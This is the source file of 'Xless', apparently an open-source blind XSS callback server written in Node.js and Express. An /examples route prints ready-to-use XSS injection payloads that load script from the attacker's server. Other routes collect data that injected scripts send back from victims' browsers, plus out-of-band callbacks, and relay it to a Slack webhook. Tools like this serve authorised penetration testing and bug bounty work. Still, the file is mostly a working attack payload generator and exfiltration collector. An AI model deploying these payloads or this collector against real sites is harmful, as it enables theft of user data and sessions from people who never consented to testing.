// Xless: The Serverlesss Blind XSS App.
// Version: v1.1
// Author: Mazin Ahmed <mazin@mazinahmed.net>

const express = require("express");
var bodyParser = require("body-parser");
var cors = require("cors");
const process = require("process");
var request = require("request");

const port = process.env.PORT || 3000;

const app = express();
app.use(cors());
app.use(bodyParser.json());


app.use(function (req, res, next) {
  // Headers
  res.header("Powered-By", "XLESS");
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET,POST");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});


function generate_blind_xss_alert(body) {
  var alert = "*XSSless: Blind XSS Alert*\n";
  for( let k of Object.keys(body)) {
    if (body[k] === "") {
      alert += "*"+k+":* " + "```None```" + "\n"
    } else {
      alert += "*"+k+":* " + "```" + body[k] + "```" + "\n"
    }
  }
  return(alert)
}


function generate_callback_alert(headers, data, url) {
  var alert = "*XSSless: Out-of-Band Callback Alert*\n";
  alert += `• *IP Address:* \`${data["Remote IP"]}\`\n`
  alert += `• *User-Agent:* \`${headers["user-agent"]}\`\n`
  alert += `• *Request URI:* \`${url}\`\n`
  if (headers["Referrer"] !== undefined) {
    alert += `• *Referrer:* \`${headers["referrer"]}\`\n`
  }
  return(alert)
}


app.get("/examples", (req, res) => {
  res.header("Content-Type", "text/plain")
  //var url = req.protocol + '://' + req.headers['host']
  var url = 'https://' + req.headers['host']
  var page = ""
  page += `\'"><script src="${url}"></script>\n\n`
  page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)')\n\n`

  page += `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${url}");a.send();</script>\n\n`

  page += `<script>$.getScript("${url}")</script>`
  res.send(page)
  res.end()
})


app.post("/c", (req, res) => {
    var data = req.body
    data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress
    const alert = generate_blind_xss_alert(data)
    data = {form: {"payload": JSON.stringify({"username": "XLess", "mrkdwn": true, "text": alert}) }}

    request.post(process.env.SLACK_INCOMING_WEBHOOK, data, (out)  => {
      res.send("ok\n")
      res.end()
    });
})


app.get("/*", (req, res) => {
  var headers = req.headers
  var data = req.body
  data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress
  const alert = generate_callback_alert(headers, data, req.url)
  data = {form: {"payload": JSON.stringify({"username": "XLess", "mrkdwn": true, "text": alert}) }}

  request.post(process.env.SLACK_INCOMING_WEBHOOK, data, (out)  => {
    res.send("ok\n")
    res.end()
  });
})


app.listen(port, err => {
    if (err) throw err
    console.log(`> Ready On Server http://localhost:${port}`)
})
